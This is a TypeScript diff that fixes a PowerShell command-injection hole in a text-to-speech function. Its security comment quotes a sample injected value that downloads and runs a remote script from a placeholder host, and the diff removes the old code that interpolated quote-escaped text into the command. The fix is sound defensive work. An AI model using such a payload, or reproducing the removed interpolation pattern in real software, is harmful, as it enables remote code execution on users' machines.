@@ -31,13 +31,23 @@ export function speak(text: string): { spoken: boolean; voice: string } {
     }
 
     if (process.platform === "win32") {
-      // Use PowerShell to synthesize speech on Windows.
-      // We escape double quotes in the text to avoid breaking the PS command string.
-      const escaped = text.replace(/"/g, '""');
-      const psCommand = `Add-Type -AssemblyName System.Speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak("${escaped}")`;
-      const child = spawn("powershell", ["-Command", psCommand], {
+      // SECURITY: never interpolate the TTS text into the PowerShell command
+      // string. PowerShell evaluates $(...) subexpressions and $variables INSIDE
+      // double-quoted strings, so interpolated text — which can originate from the
+      // LLM's answer, /api/voice/test, or a timer label — is a remote-code-execution
+      // vector (e.g. "$(iwr evil/x.ps1|iex)"). Doubling quotes does NOT stop it.
+      // Instead we pass the text (and voice) as ENVIRONMENT VARIABLES, which
+      // PowerShell treats as inert data, and reference them with $env: — the value
+      // is never re-parsed as code.
+      const psScript =
+        "Add-Type -AssemblyName System.Speech; " +
+        "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; " +
+        "if ($env:AURA_TTS_VOICE) { try { $s.SelectVoice($env:AURA_TTS_VOICE) } catch {} } " +
+        "$s.Speak($env:AURA_TTS_TEXT)";
+      const child = spawn("powershell", ["-NoProfile", "-NonInteractive", "-Command", psScript], {
         detached: true,
         stdio: "ignore",
+        env: { ...process.env, AURA_TTS_TEXT: text, AURA_TTS_VOICE: VOICE_NAME },
       });
       child.unref();
       return { spoken: true, voice: "System.Speech" };
